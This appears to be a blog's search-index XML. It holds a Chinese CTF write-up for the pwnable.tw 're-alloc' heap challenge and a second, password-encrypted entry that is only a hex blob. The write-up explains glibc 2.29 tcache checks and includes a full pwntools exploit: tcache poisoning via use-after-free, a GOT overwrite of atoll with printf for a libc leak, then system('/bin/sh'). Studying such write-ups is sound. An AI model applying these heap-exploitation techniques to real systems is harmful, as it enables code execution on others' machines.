<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>pwn heap: re-alloc</title>
      <link href="/2020/03/06/pwn-heap-re-alloc/"/>
      <url>/2020/03/06/pwn-heap-re-alloc/</url>
      
        <content type="html"><![CDATA[<p>这道题的总体思路就是uaf + fsb， 开始以为是libc2.29的uaf + tcache double free， 后来发现没有show导致没有办法leak出libc地址，最后无从下手。后来还是从别人的博客里学到神奇的姿势。</p><h3 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h3><p>pwnable.tw上的一道题。<br><br>Partial RELRO，got表可以改，基本上是利用改got表来getshell了。</p><pre><code>Arch:     amd64-64-littleRELRO:    Partial RELROStack:    Canary foundNX:       NX enabledPIE:      No PIE (0x400000)FORTIFY:  Enabled</code></pre><p>题目提供了四个功能</p><pre><code>1. alloc2. realloc3. free4. exit</code></pre><p>其中alloc功能相当于malloc一个chunk，但是chunk的<code>size&lt;=0x78</code>, 且chunk的地址会放在bss段的heap数组上，heap数组允许至多两个成员。接受完data输入后会在末尾补上0，这里存在一个off by null，但是没有什么用。<br><br>realloc功能为更改chunk的size以及更新content内容，这里末尾不会自动补0.值得注意的是，当size为0时，相当于触发free但是对应的bss上的数组中的指针不会清0，于是这里有一个uaf可以利用。<br><br>free功能就是同时free掉chunk以及将heap数组中的指针清0</p><h3 id="相关知识点"><a href="#相关知识点" class="headerlink" title="相关知识点"></a>相关知识点</h3><blockquote><p>libc2.29的tcache double free的检测机制</p></blockquote><pre><code class="C">//glibc-2.27typedef struct tcache_entry{  struct tcache_entry *next;} tcache_entry;//glibc-2.29typedef struct tcache_entry{  struct tcache_entry *next;  /* This field exists to detect double frees.  */  struct tcache_perthread_struct *key;} tcache_entry;</code></pre><p>多了一个<code>key</code>的成员变量。这个<code>key</code>的作用是什么？</p><pre><code class="C">//glibc-2.27tcache_put (mchunkptr chunk, size_t tc_idx){  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);  assert (tc_idx &lt; TCACHE_MAX_BINS);  e-&gt;next = tcache-&gt;entries[tc_idx];  tcache-&gt;entries[tc_idx] = e;  ++(tcache-&gt;counts[tc_idx]);}tcache_get (size_t tc_idx){  tcache_entry *e = tcache-&gt;entries[tc_idx];  assert (tc_idx &lt; TCACHE_MAX_BINS);  assert (tcache-&gt;entries[tc_idx] &gt; 0);  tcache-&gt;entries[tc_idx] = e-&gt;next;  --(tcache-&gt;counts[tc_idx]);  return (void *) e;}//glibc-2.29tcache_put (mchunkptr chunk, size_t tc_idx){  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);  assert (tc_idx &lt; TCACHE_MAX_BINS);  /* Mark this chunk as &quot;in the tcache&quot; so the test in _int_free will     detect a double free.  */  e-&gt;key = tcache;    //new  e-&gt;next = tcache-&gt;entries[tc_idx];  tcache-&gt;entries[tc_idx] = e;  ++(tcache-&gt;counts[tc_idx]);}tcache_get (size_t tc_idx){  tcache_entry *e = tcache-&gt;entries[tc_idx];  assert (tc_idx &lt; TCACHE_MAX_BINS);  assert (tcache-&gt;entries[tc_idx] &gt; 0);  tcache-&gt;entries[tc_idx] = e-&gt;next;  --(tcache-&gt;counts[tc_idx]);  e-&gt;key = NULL;    //new  return (void *) e;}</code></pre><p>当chunk被free到tcache中时，<code>key</code>会被置为第一个chunk的地址，也就是tcache的结构chunk。当chunk从tcache中取出来时，<code>key</code>会被设置成NULL。总而言之，就是通过<code>key</code>来表明这个chunk是否在tcache中。<br><br>而这个<code>key</code>也是libc2.29中提供的对tcache的额外的检查，即在将一个chunk放入tcache时，会检查该chunk的<code>key</code>是否等于tcache结构体的地址，如果是，则进一步检查tcache中是否已有地址相同的chunk，从而触发double free的检查机制。<br><br>然而仍然有绕过检查的方法，就是<code>key</code>不等于tcache结构体的位置即可，而这往往需要配合uaf或者chunk overlap同时利用才能做到。</p><blockquote><p>realloc(ptr, size)函数</p></blockquote><p>总的来说，realloc函数在size不同的情况下，可以达到malloc，edit，free三种功能：</p><ol><li><code>ptr == 0</code>: malloc(size)</li><li><code>ptr != 0 &amp;&amp; size == 0</code>: free(ptr)</li><li><code>ptr != 0 &amp;&amp; size &lt;= old_size</code>: edit(ptr)</li><li><code>ptr != 0 &amp;&amp; size &gt; old_size</code>: new_ptr = malloc(size); strcpy(new_ptr, ptr);</li></ol><h3 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h3><ul><li>利用uaf在tcache不同size的链表中放置一个<code>atoll_got</code>的chunk</li><li>利用其中一个指向<code>atoll_got</code>的chunk更改<code>atoll_got</code>为<code>printf_plt</code>，这样在调用<code>atoll</code>时，就会调用<code>printf</code>从而构造出一个格式化字符串漏洞，利用这个漏洞可以leak出栈上的libc地址，这里选择leak<code>__libc_start_main</code>。</li><li>利用另一个指向<code>atoll_got</code>的chunk将<code>atoll_got</code>再改成<code>system</code>，注意因为此时<code>atoll</code>是<code>printf</code>，所以在调用alloc时，需要输入的Index和Size不是直接输入数字，而是通过输入的string的长度来通过printf返回的值间接传给Index和Size。<del>由于read的长度限制在16，因此注意这里tcache的相关chunk必须是<code>size=0x20</code>，否则无法利用。</del>（可以通过”%xc”来控制printf的返回值。）</li><li>最后再输入<code>/bin/sh\x00</code>调用<code>atoll</code>来执行<code>system(&quot;/bin/sh&quot;);</code>getshell即可。</li></ul><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">context.log_level = &quot;debug&quot;def alloc(index, size, data):    p.sendlineafter(&quot;Your choice: &quot;, &quot;1&quot;)    p.sendlineafter(&quot;Index:&quot;, str(index))    p.sendlineafter(&quot;Size:&quot;, str(size))    p.sendafter(&quot;Data:&quot;, data)def realloc(index, size, data):    p.sendlineafter(&quot;Your choice: &quot;, &quot;2&quot;)    p.sendlineafter(&quot;Index:&quot;, str(index))    p.sendlineafter(&quot;Size:&quot;, str(size))    if size != 0:        p.sendafter(&quot;Data:&quot;, data)def free(index):    p.sendlineafter(&quot;Your choice: &quot;, &quot;3&quot;)    p.sendlineafter(&quot;Index:&quot;, str(index))bss = elf.bss(0)atoll_got = elf.got[&quot;atoll&quot;]atoll_plt = elf.plt[&quot;atoll&quot;]printf_plt = elf.plt[&quot;printf&quot;]libc_start_main_ret_offset = libc.symbols[&quot;__libc_start_main&quot;] + 0xebsystem_offset = libc.symbols[&quot;system&quot;]# let tcache[0x20] =&gt; atoll_got# heap[0] ==&gt; chunk(0x18) &lt;== heap[1]alloc(0, 0x18, &quot;AAA&quot;)realloc(0, 0, &quot;&quot;)realloc(0, 0x18, p64(atoll_got))alloc(1, 0x18, &quot;BBB&quot;)# now heap[0] == heap[1] == NULLrealloc(0, 0x38, &quot;CCC&quot;)free(0)realloc(1, 0x38, &quot;D&quot; * 0x10)free(1)# let tcache[0x50] =&gt; atoll_got# heap[0] ==&gt; chunk(0x18) &lt;== heap[1]alloc(0, 0x48, &quot;AAA&quot;)realloc(0, 0, &quot;&quot;)realloc(0, 0x48, p64(atoll_got))alloc(1, 0x48, &quot;BBB&quot;)# now heap[0] == heap[1] == NULLrealloc(0, 0x58, &quot;CCC&quot;)free(0)realloc(1, 0x58, &quot;D&quot; * 0x10)free(1)# above all, we get two tcache point to atoll_got that can be malloc# alloc once at heap[0]# change the atoll_got to printf_plt# use format string bug to leak the __libc_start_main_ret in the stackalloc(0, 0x48, p64(printf_plt))p.sendlineafter(&quot;Your choice: &quot;, &quot;3&quot;)p.sendlineafter(&quot;Index:&quot;, &quot;%21$llx&quot;)libc_start_main_ret = int(p.recv(12), 16)libc_base = libc_start_main_ret - libc_start_main_ret_offsetlibc_system = libc_base + system_offset# alloc twice at heap[1]# since the atoll has been set to printf# the return value of printf(which may be the length of the string) will be regarded as the &quot;Index&quot;# thus we use length of the string to make &quot;atoll&quot; work# then we change the atoll_got to libc_systemp.sendlineafter(&quot;Your choice: &quot;, &quot;1&quot;)p.sendlineafter(&quot;Index:&quot;, &quot;A\x00&quot;)p.sendafter(&quot;Size:&quot;, &quot;A&quot; * 15 + &quot;\x00&quot;)p.sendafter(&quot;Data:&quot;, p64(libc_system))# input &quot;/bin/sh\x00&quot; and call system(atoll) to get shellp.sendlineafter(&quot;Your choice: &quot;, &quot;3&quot;)p.sendlineafter(&quot;Index:&quot;, &quot;/bin/sh\x00&quot;)success(&quot;libc_start_main_ret: &quot; + hex(libc_start_main_ret))success(&quot;libc_base: &quot; + hex(libc_base))success(&quot;libc_system: &quot; + hex(libc_system))p.interactive()</code></pre><h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><ul><li>将<code>atoll</code>改为<code>printf</code>确实是神奇的姿势（我没遇到过），从这个思路上看，貌似还可以引入本来不存在的漏洞来利用。</li><li>调试的时候gef好像有点问题，peda可以用。</li></ul><h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><ol><li><a href="https://www.anquanke.com/post/id/194960" target="_blank" rel="noopener">https://www.anquanke.com/post/id/194960</a></li><li><a href="https://tiencong283.ninja/post/realloc-pwnable-tw" target="_blank" rel="noopener">https://tiencong283.ninja/post/realloc-pwnable-tw</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pwn rop: De-ASLR</title>
      <link href="/2020/02/17/pwn-rop-De-ASLR/"/>
      <url>/2020/02/17/pwn-rop-De-ASLR/</url>
      
        <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="" />    <label for="hbePass">Input password</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="ed7cc47cfd4c2c4809f59bfc05eb6a570d9e976c2cdaffaeda33bcf0a7503efe">f6952ccfaa400f44b040eedaf2486285bd7cf4547c6ccb6e3e3e004177a6b24a3721692928bb1a39e8a7740706d8f96e4f81e997e3d6ebcf703b5abe846eebbe0333b6b421479fc8ba2503529bd6536df5a015e6e8201f2e82c2031922a68056547b040cef0a901a89cc65a8f224fecf3a8d438eca75c94e92eef75288db2a52b1af4148541e470310f52450b0e2888a4774676dc8287edd7b12a034e233aaceea4d488f61d61a8e7b78076e0db3bf7763cb9cf8640aea304e3300b009c07ca5e944fcb4ad21756b3a3471498eec959699885844918f50f1caab217048e7ba93d9b8c4848acdc1842222376347714c2919664b10cc8c951cce9e0e19fbd7140b43c8164ade9a875b7ca545e20b68e2f326b7fe838b10cd8f2074d4fdedab7713aa5c3eeaa375ca8c1604a24b36fc5136677fbe5b75e34a502bccff7ee08e110fa3ac512de8a433ae9a8b584f572e53232f1179d289a97e1ca9c53b057266963f135b94e5faab4a9e30ba27ebd9100417e71146f3dd44f5608542b20eec4e2602b0e4f62fc423b0037d1d433a8d3be0075679091ffcf04be6be3d1ed11cb23e4638af1fe5e9c1826d09320863220efc61cdc2b8a1454c29d771dd35bb7bc63cabcb77d2d12f4bbb7c3193799598b2e4310af8b3475ce5b8385b0a0721ad7fbba35adadc1872126d4e392908fc05bb4b0e9fe955559cec2be10dfa9a3b833db88da106a7a533cbb9b2db57cbd38c8c78c4ace54591162828708da7f7a5c34fbe55f794aa55d7bb06da88676ed73eae34c657c1d4503a98e5cbf202b12134d36e3dfb082b9962096afe093c6437ac2c9e560a744c37c8061641ac6375429a2aa79a05da66adece094bcd12d8855d7d960c60d5f99940289cfa4ee01fde4edad9625c09c6fa67884412fd602f0bd97aedf321bc1047d38e7ee792ac3c0d00dfa1cdc292e140b1869e2887cc39010d13c275f6c0580cc174bc386a78dcc8ff9e17b5a0379b46a2ab541230d6e1283cd2e12996e08ad351eb3b574a167a477c308fe30274725dd9c3efe7f889a6cdde4d836beed0926e91791022e7e79c94624edc7d63ef73cdee90d3ed01222d0cc8eeaa754bbaa809b34a892d5e300f5d5b021045c6569d7af56c5233eb62535d64992ee9fc8e8e6886a71fdbc88dcef6afd4efc770326ed1506c68d6f4b1bbc058cd5a745201ba57950249f1232e387c90a94a8e47449b56065447f246c4e1db862253dc6b7f840b0996512becec6993ac083b1a7a4a9b9b92d11f3d10aa1d8210ff7ad4b47a5af5152a351ea388c2929ecdecf58222f0b4c9536555a5dc1c71edabf1e1d901443e1f3de202f9a79d1c4f809af9632b2c629e37005e986a9b18569728af852a586dfc5e9cdb8b05c01e8ec7cf181024a929264f0d64b461c28d9ba081621f8d54448f6ada7aba9a2e9cbb830effda28934e1f47d9c419797fb909ba4ad798e17db310940e207ee7d95a1999c84d2e96fadc3845971e1001adab9106ff0a62cce512a5d1fae61370c9afb6b520405d3cd47b66d4298aa232492a381830cc6194b3f62e81ac3dea3b24a5b4f059b6715ad66a23e58da2b4b5dd7a13542fa5395d10eb1af17e3bb20c43191f97946c9b1ef3e4aec6d48889be1da4ac6f22e04e6b16a588c0e2fa68dfaa10db500cc063ee40bd43a9c311694679b0169cfc5d241902caca766c339f86c7192a6ca6ef837eddd981cc542fe54eb5b3b3ee1cf32d48236d31f701ce9e744782b6ac4d0bfb4143a5a964100e9342818fca964d88e6206876969f9cbab98dbfa89712b6abecd01ab81f403b27ace2ebbb2ee6fe035939e861d27222c66e0e1423c9cecfd70da91bee786f23875ad9ae0408e54831dd1d2fb52df9871d480c3b52076e7757a7aa3fa33e20a44309638d3715bd95bb6ec0073401f4b6c5296dca0257669cc90df9a9b537625390c0962fae342043779ce5dde0a70e94da0eda13eb9e8d612fea9323a90f4125272a767588fa780a9e600ff92aeaaab4b7fb0f6d97ed451fa1176ac6f9fd60c5d931fde7ae86fcf61140b9362178f7aeb80c4484e4642198d1ea8c51b3b9eae317656af93c1c76601ec9293ceb7bbf3a9ddbfc48ad65a79c5e135a11180b2022ca0f71e55ecda67f074eb3f20cace9bef6f16142fbe4cdfe6adbef116304e493cb72949f13e64eba3607fd2077d93d6438470ae3dc5e52db46c17bbc2d84c7b1fce2608947e32c40b4b7bbf6767fa3091f26310e5d30ee9e236c635c3cf61e77543cf219c7bfd496351394fe77f331b0f74fd262c7172707ef0b5de1f8558fbd73d3a5580a05335b201ab42dc9397cbe03ba894f8effb78f22f944d05b64eaa9eb2d0f379fa15110a6d8453cbe4f4c9c7b3b33ee7509ed09b23b2bdae5f5437cfaa6e3bce6a410793a8df7a97f2026404885be7002195881dd2f37ae1f6d4c45d6edf183fab6b52292de3d01f61609dbd62c4a806a82bec3a820255ae4244faa43d96eb082bb23ab99408f166339df7d7b3c562393a9d02327f7176e7b6fa14c26b751c299156fdf8cd44e9fb2634516a1081a4bdabf0258de0de6020d6ba331292107e3a00b5e2519dbe0b3797ed6efb4e6b34cf34b8379cfb3beb38f94ea0028e1a1f8b5d89c89f5ca8852fcdd51ce152b491ff615a60b1583df7d2b86b723204366f1ce0631f0110d346ca4f866adb1fbc45bf658581f014e064b0a5ccab8452081b97bd00da7e7e550bf3bafa9277e145d25fa72dd296fb65634265fdfcfb813a411fb191ed87ef7ba4d52519dfa607d0ef8a8ab9f40e8ed8d1d62e4c12d31fb428533b7b66119be250db6faa831ce654e35af84ac1c0c1ba1f9a6518bd8780eed49612af8e0da22ab2ea2cfac43cab87da030af808093dd99d0333f6e97b9e37b7514d8725efce52200b0546c1fd5f768e44a070e532f7f4d4ff42890402806f0caef635920171e54571b38a0d4109b14fb778b11899fb5272bc53fd3083876cda5cb92efd0c56aa4a37735615bab82937f6b6bff1c990eabdf167282defff7c0e324a93bef1ac83dc815e1f22288b7a0f2121660972c38da5ce245ccfe916f7aef5a509513cc3c51ba434e056d52870e27d38bb4cf21fff525eb27e4a115e6525fd6dcd233f1249dada363630c2c563e3969556a85458cb22e6a85d78d996b180ed77ceaa0a63ab1dfdb8343390c105b0a40646672cb4cae500c8f0a56177366953764a56a8371a5caccef45e44eb4eda0187be4e582ec6185feea9b37793477c2988df0a1ba38cea563251d46310685ad7a3b9ba7c58419dc7816c39a4e0f9fb6e908fc98a25ee425b8d1318df96ba3a683783241e7f84fc7c227ea42adc1873cfd7ff1e3a2d833dabd0944466a01426539447b15c51734f3db27753919e2ac5311ca5db047c2409c70fe6b4b8abce879e1364e123f434bcf8d89ead9dcdd880e574ec2a99399bbbe70c4584d5a5bf5f50cf2931279e33c8eeade4013563e1ada25c1cd4cce706e067c71ca146bf6a496dbd615789c7e3c3d928c987765a4be4cb0763739508329d1902e303adfb0fe1ecf76c020b1cea8aad19a9b6cfaf14994dcbe02b65be058fab2206ee974c0eff931e23dda543998ddd8a4af8af491314852559e6f4387fab16117ef45b1f3767dff6893b3afb9e7274b6e3938bc0be15eb93e8966b5bc27de722dde7cf5c4ed39b141df8ef19f5859935ace4903bcbd1ffd026f97e52048eb1a44dd1eae513db6793a78962d72fdea84530c1b16697191054ee62dcd64e51ce6d4835b96bb4ef8e6070fae1db14bd9d3e81bdac05cec4814449c32e6214c3797e5271ccf334f609b470d5ca96581f8925f427819d775a92dee9ad4156c9b5d6a7fe019313f22b16b43dac466ac0d7443be7b3813f6f69a53786aa55ee0218ecff73e0291216ffed807a96dfd0c23675e86f44bfaa6df2eab79dd41ad1544183e373db33edd56d0a538390048d00a82d191ddb8d8404d4d89aafa82196f5f1fbbeacd38f725065ddbd1761b1cf920dd708b212bced77c90411fe747a5aa611bc6e5a08b83ce27128d0e9da0e5dff4fffd2fab8124dd4a0a84a803715b959f03d3239c45ba702702b219ef7029537e6ea648ca856a4145726625fa9388d191c45fa6e2f641e1c6c2bf2783cbf17bba31c756cf3d4953fca824fcff9c102b1cbdcc7ffedeb8ec8c643ce002f18dd52eb79c055bb2a08b0664f95860f7e9c8318cc8ee4c1206c2f6839c121aa12f8f1646f00b849f2c415c1d9db9839596fef2179f8930af07edb8622a2c34caa414d993529f1a345fe672837c91a285962319c7c45d7dc01ad89e348dc0180d693710cb32e58537f4bfa01990296f0d9acc83f97bca09288b0a6cb7f9d9f4ce2feb644cad48d6259111965b230681c499bbf47139bb1151ba9275ad38b5330f021a3d89dbba4474bd872d427fcacd26522b617919aee492b81f2585f90c9bdf1d8fddaadd2a3f004f9a847024d24523309ecb5b9236ad7a32891c2e356ac6f8f127f0c387ecacbb47033f11ca28047db652815080eb9611d991c1fbe1e8380d39d6525fb895716bcd80b279f5d89c171856f2fcf1169b8a706fbedcf1761b32d025de14c9adad5335abbec7c8ea577af73339b80c260072abfcd945252b2ee5b1cbdb82e9647ffbd65f6ebab6ed13a9506fad68b7bbe596dfa1ee9312dbd470bee08d6eea0d2f764737b2c59ef39086b0bd0cc3888c64d3a60a3c4c532c2b3c43acfc61b38036837e0b82178d1e1b2d12dfa3cbbe14878f79462ab3a2897d7e60b85bbbc84fe6a16bbd414bcec66866ed4c5796fac43b1bb6719039e2ba9db5ff565fdb4d76725324ece5ca8a0fae443a59d17505385ac9f8b4b82d27eb530a65f5771b36070c9b949a0bae7b3fdf09fc71afa6eda274f7efb9fffc5392eaf83957af91715cf24e2fc6ec83e75a9837df2b339067ae6ab2dabec8262d9612c664ef37a576fc677a9d9d82264459f713266c31b5161b131a8627ebd1986613b596e367f6b71cdfeabc5af91fa6a56d4ea28c2942fb755666f808de91f3951d96a567a3eeacea71b92fae3a2f9d80333179f7e672b64138808323d6ecda88587aaaefca5690436262a33a9275c4adae2ffa2989ccad1b704cc35c85afbbf6f94452282fa5a89ea62eb7b28b46e43b05e0313771ae74dbf8e1d92dadc6185ef5b781b13147a8397ab8c7757f03d63ab4ad7b8b03b6ceca089c1b44adb3185361625f40e401238dc23f373e23b1132a00df45657af1b2b4ec3ede1f5ee77f2b7255777dae72ff796725ae53ed101ace3dda1430ad35a84ee23a0bca5a63b1871d5f39cc19a9b82f61ca894afbc338a1d0c7e2dbe618df746341d2d960637b67334973be5a580e83c29dc621b1f89c7a86cc1d2deb8bd784768a61e4c9f16d679450da27e504da3f9dd058e6adafa8e8db323ce31a6183b34c0feee50ef8c529b8beaa785afe83d1dda8260afbaadd8565ffebb3679e44bf4e9185fc4f5f65f89e370eafc78fe0f7c627ea2049cb92dd56053c07e057bc6fa2de698a7d254c83e65284f62e794247aca1c4049b74e95b77011b7c9505bd5856dd832939cf3a56c31bccaf1e138240b07510f9797138f47e52bc8b16e8a77d6f6dcc22159abfda96421376d4465ed3f82bc37445985b3ca0a6c4013585927dc0f7504b18f8b7ad689bc2f3a26ad103c930235e51e8ac171519e2b51a67e5376e4b57e6e593c0a6f7c5acea1788ac3f070537c296512175b7365865747b95a4fbefeca485b82152e09de2bf812ca2452ac1d50faaf92b4b3195cb6d32e89b74dc14742dd0c1e910707788393a4bf51fb4f171f21e92e6f5c3f174a3445ee640e082feb57a06c9246e1a62ab684d81d5c915dc348ef856f1cecb2a5e61d0d236573e456c42dd7c5b8f68129d2806f09ca453ac9cba4663860800972b9dfb37e14695e0fb88aea0bca087a84275c02affe71b8eee0fd51642efabc7fe906022a9a1bd95232a8f97424a376ab8d3fd9b24323574c799c82ec01afc264052688f01db4d9a59b2bc4d9d416f83f635fe101c9c6c1387148faa76b73d1158c77ce859d8fd1516b157cc51771bb750aeb87bd56775b104b12c721d147d14d66ff29d2b0ab06ebcea8a9493781f485a39b7320a40ce3e0156dd4de17ef1b213d6cfcf5866f40f9bac725735028b0d4342d720af06511958a518423f091c4f1fa7bf4a41320955273663028f4f2cb337dc8e2208f607b9dd2b6bd6daf078d116d34f24eef23f674f7fead9427c366a427d1cb6908c8daa6720f6b58927ac7bd5238df7f3cadbd86921e12366b2bbb436592ebd923a2b77841efb3f1c60a6cddfb4856d5e5c3b955d84891ed6cd8ce417a6267e15ea5541f914690534945c8b44203e8ccec06af19051b3018688cba7898df9e18874cae75a08ed536bee8180cbb09d689b24c7ecbf58836d707aff12b7f640528aab2bca84346b980906c43b31520558c4f6753cc9513551d310fb6e6d79551f43b7fa70916373becb8f93dedd8ebda5fe00f8414b28a123d7f7cb45ed005e9c05f130907ea5b039e007d37673dbd820578f1e61e4d86617ec4f5e9bcc5b365afefa942ba003659a33f4eca121437c0efe64f68055da99f444d3e58c3ffb6dc246da929198d7d7a02426e13d9b2d894303106e77be5f70e0d0fc90b93fe5ca79bd72a67b9855f8fb43068281eaa0ce8f40c884663891b150d6d3f2c295583fec19857e2e6d6b06733d504e4c6266428d8100264dae4f6aac2db397c9c53bd54ae3a1bb92f1ff53229942276f31316c803a278bb65b214a76f1155fea096c65376c5d3920efb7f296a41c012467176ddbec5e3df36a283974c8474b89a900a57b3cdd3529d6593c6a2298696710242112e939b692652c916cbe232ab7122d08c008a0b28a1ad85d5b82d72b1941f4d5b6ef3fd3cff68bb8a8a6b778e363b85006769a18591e1a484909eb275f3f31982903de38c666c39f60cc46f64269a49887908818e9a216e5494c59ef20f23ab9d0d06ecc4ac995eab2413a468d94f87fdecb193e3f782abfc9d74b176b334541d242d727cf59c116975675aac930c9c0b9df29f9d3d3cc1e247f8d67e719d9e5b0f94ec33a3f499efde4190da0dad51b9564cc649a03c7b3ee955fa73c1d5d95827a161e6f2ab1e51425ea162a520011f6679ddb9f4035084e4e17d65bb31e747561eaf351c4e6ac53c11633e46f78531e5fbdd2b958d6f23ea4e2fba22c84697fb7403c1266e61017d75e8342f6ad5b6b5ed2f1556082966a6b4ee5374bc17a8ca7a9f45e7a3080630a4e8c8cbbac5e7745ff3b87b66ddc593f9849f5fdb480fe6a1f6d9aaa1a1436159582342a82bc8abb527e4c2ddcc8f945ec814802ab872d9a4306841aa04b9b236de4b36094af731c47281d22972ebee6b036ec6e56d6bd8b7e1508add86f0685fce7f93be0dcccde4c2a3a0dd246d5f2c69b52f73cc63d8f0cafbd847d0e93efff212379e6e5029ac19cde04ba4bc1a5c60cfcd4b9321a5d23ee95b9d5efafdf9e55f73624d0ced74902f7f55d491bf3311e20c1fe0921efd529fd308e6ec638aaa50168a14431a52acda6cffe66e55e16e1069e2ce0311840343f7c5fedc5c54ce6427397906becd8259bfceeee9141a9b719fec056ca9e2c51aa600611eb352a869c4d325309c5982cd296bcf95d7c10cb1446ed12823d9164771e7b1b94d3247ace5f7575fd105fdf77ba2afefb02b4589870146bdd1b68e86970c6ec9144e1a1aa065d400f48988f59dfbeb9d36410296578cdb15a3ad48d0d235c13d978665321c1e5d8cc8d4aa0a779f1fdf2ede0f723342d87fe04ed7c730f8ffaf4193bbc907b7585c25f8066e1522c07437b361bd063f264b30b809729d95f26104ff4e7276af7cdfd9d7cd7bca8c8ec2b7de7bb2a1ff07c437fb07734958dae0740942047a303391201002292e1b38fac9f6a4ff4d5e030558981ed118d41259ccabf19741e6c1bd9056df03290a25b62f305a37f71bb2f305fc5a9da920172dca2817c950d24c9abb701861dbb95b119a2d2c5eb165398b7cbda43eab88ef9149ab1548863b08e2a51fdd8a9697d05abe133ce31ca26feb4898e12881f3fd7ea2af3601454dd52b0945acd63d214f93a4ae9a3a4219306eed0f68887ea0a74833440190cea2a1eca37c18c55b468d7aab2c109158e715e4d476e75f74391af698fa5bcdb5220c9ba9d6e461eb46b7cc8850de8a303daf9a9e3618424047d3cb4dbfca0b0f8d6fb4c46b5f3d8a4bdc3fb05ed72340f057e31bac786c33dcff0c8de74660044fef189a90cc274beba8bbfd1aaf36650d514c59b8aa3f24e3b634472c80581d99da5dd1868a60846671f039ee44f90d35fb5f62e271fd781d3d95777fb1011dcbdaba7d23fa544e7d4794999a9efd2f4c5f7239c9ee0a3185e148fbc792a7087c38aae54bffbdb6d6f1dba467e682ff9926ec38691d4604c1603a1d24338d4e2f17e273b1fd7d569cc8e94e350265a397095ddaebcc0ce88b8c1161c914dcd824b59a949521cebce7cae3c81ff2e002dade261a695e131ef190aa242fb2c7fdca6cab8982f26dfb14afbd2741bf805a9ae509a504d645af911ae2cc0b8866304faf403ad05d934dfe25d49f418fe89398d14925f3593604e3c449d7d17d843f825a05e8abdad34e52b9d18dba3b967a48a11f32ab98bcde4ec241afe698f1442a434db430679c0f4fdd602c1bfdb275a89118e8f014026f9af3b5bf5f9692a1ad721b0958fcb764d7539d7edba42a1241e8e18a8b4d51f5a4c1174d465b7498fc07b02a8001ee35881b8bec430998732ef5033e09f459ec1092fa94f12027a0660bb8bc7e32bd7cfc5c0f51181f7f42a14d54e72acd06532410f5b43b472fd5fd34ee95687f0a883ba8a9a21cf5ebab6c434f4504d6c8ccaa73e2c85eb259cca7151ba734f409b0b1254fc19fb678555757c61be802897d10758d028b15b3fe642545d61484dd9c985e8157a5dff894afac7f0a70013410a9cc95971a4f9d95cbbb2098ed599276435bb639913142e980f3ed38f15ed6e1537ad0587cb6b0f722672584df962682efd941962dd512f506bea6931f6cb38cc44844d6866816c2b329765bcaf0ce9b43e718b77d1f63824ab142d88916f1a48028c5e4b0e3c55ccf61f4c55aaf927f160c7b2541aeb94d23f2f503b4ad4172a652c73dd2c60db7a618af66da5d72d5fcaf350eb56b5a78ec2c5b95dd6eb87f55699c805afed84b0b137ccdb761aafa452bb470ef6bc10420a26be42ab70d08a84e15624138c39f730b1ae410feccc8f9fb8530b3c18d38a20a39f66763b43c800edc0b8daab7042e5e9bedb794f363c5d9ca8affd9dd75de2affa0dba29ad152092cf74dd922007ec07a2234e21742764c996cb1ed4c4d083477976fed4efef110a7c2c8de0b4576235ade1e5fd44b9b79d5fbbef7928b507fbf5b3136e01e3ea0b6dcfb2b7e02a8ab8ed798037381315e3f5b80b29df468e80c7b3bdae55252b7eee334d9d55c8a15885d2142ac12cfe0a9779ee128a780d342037668b0ff922c89d999b6b01e294d1fd196dd21a4ec02583731e6884a7cf766589d1f40deed3d32a2a5d8f0e8d74674948e4ce0993c60403eea6f3cb2061376a4c6700a4bdc29641a50228ba90e676bce9ee0c01b54dc77ef30fd2f0e53ca8f148e876db265819f2444fc2abcbab1bc6be57cf34d5e25955a4d949e2bf2dd1a939930c8e99d0b6d61e74369075fead642487a0bb1a57c19d33e80880a35f021fee5578407041a5ceb8cf18fed25392f8cbe1a77f498f6959c5e945abf7cdee14f23a6e0c1ca883f348eeeecf0b9f9626c9583d861d4eeb4f0c4cf46c242611c0ecfb0c3a14824a1172d8598c7ffe3f4d0681ef7acfecd3620b91d5c923c600cc4ec74bc2e358d01fbccda6f56ba145f2ac9bc9fc1ec97b096d7c269caa0602a08b05075a1d986686cdbd5d2f9d64f2fa7a2e25c7f7f2a0e30debeb4856eb6f1ae61d1aa917d56ac7a453943d2cd32b1bb8c1fd79d1ecdce412208f78783168c289eb6f3ae93c1edad2136732828a464e7cd191e72c9d9e8d7460aa99605ba5a49fe13ce2c88a8fca11fdaf6515fce75e99e36658a10bae91dac8b928e4ae0c367a570b87ca4d5bc086c2a91cffe754ad7ac11638b568e013a2f2282c71315c71f9df238058ec7a679334f5f7870afbd18e56a08e9275c95f9781b202dc9371cb5db11b2c64dd724728d2169adb7a1e26b344b4cdcbaa94301663375b68919ca2650ca62c3dac50f65cc3bc7a2b5488deacfb545c72391bee10023c9f7dcbb5af591289e5ba51f573a6d1579ded25dfe1c03ab86165f451c378cd66098a20de3b566aabc6ef975b6a14a85452a4d9c38f5455eaa766a6b1a4f5c319d850e8cce5dbd841b8946de9a3cadd8afe410ffe1323e3e45ea7841873bb61d6aad2aa8871a039884a61354ef1558d5b9933969903210c458625b9a1e05e7d28b70187317d38a3786b993d09cf22de13852e51a7d12f80f92bc1b3d916d3e36b701150e29845b2135059536b805da97de179cc4c007ba943f838d33f736b2dcbe196ffed71e621dcbbf7c8f64c5b045fc9af00e35b130c0a0b17231b739a48a8e5ffb0988f2c57e47773243b79baec0bc18c72cd07ebe1bb6337319e48fba551ab1ee142253420097b4de60b6189772ed9056e308fa89e6bfb7a74a8c9d80e91a8aabb2c05c1f05a929c8bf18fc4dab65884